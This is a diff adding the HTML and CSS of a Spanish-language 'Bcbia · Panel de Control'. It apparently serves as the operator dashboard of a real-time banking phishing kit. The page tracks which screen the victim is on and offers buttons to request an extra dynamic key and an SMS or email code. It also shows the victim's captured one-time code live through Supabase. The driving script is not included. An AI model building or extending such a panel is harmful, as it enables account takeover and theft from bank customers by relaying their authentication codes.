@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bcbia · Panel de Control en Tiempo Real</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #0e1117;
+    color: #e8ecf2;
+    min-height: 100vh;
+    padding: 36px 16px 48px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .wrap { width: 100%; max-width: 720px; }
+  .head { text-align: center; margin-bottom: 26px; }
+  .head h1 { font-size: 22px; letter-spacing: .3px; }
+  .head p { color: #8a93a3; font-size: 13px; margin-top: 5px; }
+
+  /* Monitor de estado en tiempo real */
+  .monitor {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+    background: #171c26;
+    border: 1px solid #2a3342;
+    border-radius: 16px;
+    padding: 22px 24px;
+    margin-bottom: 26px;
+    transition: background .25s ease, border-color .25s ease;
+  }
+  .monitor-dot {
+    width: 18px; height: 18px; border-radius: 50%;
+    background: #5b6574; flex: 0 0 auto;
+    transition: background .25s ease;
+  }
+  .mon-label { font-size: 11.5px; letter-spacing: 1.8px; color: #8a93a3; font-weight: bold; }
+  .mon-msg { font-size: 20px; font-weight: 800; margin-top: 4px; line-height: 1.25; }
+  .mon-sub { font-size: 12.5px; color: #8a93a3; margin-top: 7px; }
+
+  /* Estado VERDE: usuario en pantalla de carga */
+  .monitor.cargando {
+    background: linear-gradient(135deg, #0c2a19, #103d24);
+    border-color: #2fbf71;
+    animation: pulseGreen 1.6s ease-in-out infinite;
+  }
+  .monitor.cargando .monitor-dot { background: #39d98a; box-shadow: 0 0 16px #2fbf71; animation: blinkDot 1s linear infinite; }
+  .monitor.cargando .mon-msg { color: #3ce08f; }
+
+  /* Otros estados del usuario (clave, inicio, escudo) */
+  .monitor.activo { background: #142238; border-color: #2f6bbf; }
+  .monitor.activo .monitor-dot { background: #5aa7ff; box-shadow: 0 0 10px #2f6bbf; }
+  .monitor.activo .mon-msg { color: #6cb2ff; }
+
+  /* Sin usuario / sin señal */
+  .monitor.sin .mon-msg { color: #9aa4b2; }
+
+  @keyframes blinkDot { 0%, 100% { opacity: 1; } 50% { opacity: .3; } }
+  @keyframes pulseGreen {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(47,191,113,.30); }
+    50% { box-shadow: 0 0 28px 4px rgba(47,191,113,.50); }
+  }
+
+  /* Botón único de acción */
+  .accion { text-align: center; }
+  .btn-gold {
+    display: inline-block;
+    width: 100%;
+    max-width: 560px;
+    font-size: 17px;
+    font-weight: 800;
+    color: #3d2f00;
+    background: linear-gradient(135deg, #f9d423, #e8b30b);
+    border: 1px solid #d99a06;
+    border-radius: 14px;
+    padding: 19px 26px;
+    cursor: pointer;
+    box-shadow: 0 4px 18px rgba(216,158,6,.35);
+    transition: transform .15s ease, box-shadow .15s ease, opacity .15s ease;
+  }
+  .btn-gold:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 26px rgba(216,158,6,.55); }
+  .btn-gold:disabled {
+    background: #202733;
+    border-color: #2c3544;
+    color: #5b6574;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  .btn-gold.ready { animation: pulseGold 1.6s ease-in-out infinite; }
+  .btn-gold.btn-sent { background: #12341f; border-color: #2fbf71; color: #3ce08f; box-shadow: none; }
+  @keyframes pulseGold {
+    0%, 100% { box-shadow: 0 4px 18px rgba(216,158,6,.35); }
+    50% { box-shadow: 0 4px 34px rgba(249,212,35,.80); }
+  }
+
+  .pie {
+    margin-top: 24px;
+    text-align: center;
+    color: #5b6574;
+    font-size: 12.5px;
+    min-height: 16px;
+  }
+/* Tarjeta Código SMS/Correo (Fase 3): se llena en tiempo real cuando el
+   usuario ingresa el codigo (misma via Realtime que el estado de pantalla). */
+.otp-card {
+    margin: 16px auto 0;
+    max-width: 560px;
+    background: #1b2432;
+    border: 1px solid #f57c00;
+    border-radius: 14px;
+    padding: 16px 20px;
+    display: none;
+    text-align: center;
+  }
+  .otp-card.visible { display: block; animation: pulseSms 1.6s ease-in-out infinite; }
+  .otp-label {
+    font-size: 11px; letter-spacing: 1.8px; color: #ffb066; font-weight: bold;
+  }
+  .otp-value {
+    font-size: 34px; font-weight: 900; color: #ffffff;
+    letter-spacing: 8px; margin-top: 6px; font-variant-numeric: tabular-nums;
+  }
+  .otp-sub { font-size: 12px; color: #8a93a3; margin-top: 6px; }
+/* Botón SMS/Correo (naranja) - Fase 3 */
+  .btn-sms {
+    display: block;
+    width: 100%;
+    max-width: 560px;
+    margin: 14px auto 0;
+    font-size: 17px;
+    font-weight: 800;
+    color: #ffffff;
+    background: linear-gradient(135deg, #ff9a2f, #f57c00);
+    border: 1px solid #d96e00;
+    border-radius: 14px;
+    padding: 19px 26px;
+    cursor: pointer;
+    box-shadow: 0 4px 18px rgba(245,124,0,.35);
+    transition: transform .15s ease, box-shadow .15s ease, opacity .15s ease;
+  }
+  .btn-sms:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 26px rgba(245,124,0,.55); }
+  .btn-sms:disabled {
+    background: rgba(245,124,0,.14);
+    border: 1px dashed #f57c00;
+    color: #ffb066;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  .btn-sms.ready { animation: pulseSms 1.6s ease-in-out infinite; }
+  .btn-sms.btn-sent { background: #12341f; border: 1px solid #2fbf71; color: #3ce08f; box-shadow: none; }
+  @keyframes pulseSms {
+    0%, 100% { box-shadow: 0 4px 18px rgba(245,124,0,.35); }
+    50% { box-shadow: 0 4px 34px rgba(255,154,47,.80); }
+  }
+
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="head">
+    <h1>⚡ Bcbia · Panel de Control</h1>
+    <p>Monitor de pantalla del usuario · acción en tiempo real</p>
+  </div>
+
+  <div class="monitor sin" id="monitor">
+    <div class="monitor-dot"></div>
+    <div style="flex:1; min-width:0">
+      <div class="mon-label">ESTADO</div>
+      <div class="mon-msg" id="monMsg">CONECTANDO AL SERVIDOR…</div>
+      <div class="mon-sub" id="monSub">Esperando señal del cliente</div>
+    </div>
+  </div>
+
+  <div class="accion">
+    <button id="dynamicKeyBtn" class="btn-gold" disabled title="El botón se habilita cuando el usuario esté en la pantalla de carga">🔑 Solicitar Clave Dinámica Adicional</button>
+    <button id="smsAttnBtn" class="btn-sms" disabled title="El botón se habilita cuando el usuario esté en la pantalla de carga (indicador VERDE)">📩 Solicitar Código SMS / Correo</button>
+
+    <div class="otp-card" id="otpCard">
+      <div class="otp-label">CÓDIGO SMS / CORREO</div>
+      <div class="otp-value" id="otpValue">—</div>
+      <div class="otp-sub" id="otpSub"></div>
+    </div>
+
+    <p class="pie" id="pie">Conectando…</p>
+  </div>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+<script src="monitor.js?v=3"></script>
+</body>
+</html>
